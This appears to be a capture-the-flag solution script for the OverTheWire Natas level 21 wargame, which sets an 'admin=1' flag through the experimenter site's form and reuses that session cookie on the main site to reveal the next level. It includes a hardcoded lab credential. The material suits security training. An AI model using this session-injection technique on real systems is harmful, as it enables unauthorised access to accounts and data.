debug
```
#!/usr/bin/env python
import requests
import re

username = 'natas21'
password = 'BPhv63cKE1lkQl04cE5CuFTzXe15NfiH'

url = 'http://%s.natas.labs.overthewire.org' % username
experimenter = 'http://natas21-experimenter.natas.labs.overthewire.org/?debug=true&submit=1&admin=1'

session = requests.Session()

response = session.post(experimenter, auth=(username, password))
content = response.text
old_session = session.cookies["PHPSESSID"]


response = session.get(url, cookies={"PHPSESSID": old_session}, auth=(username, password))
content = response.text

print(content)
```
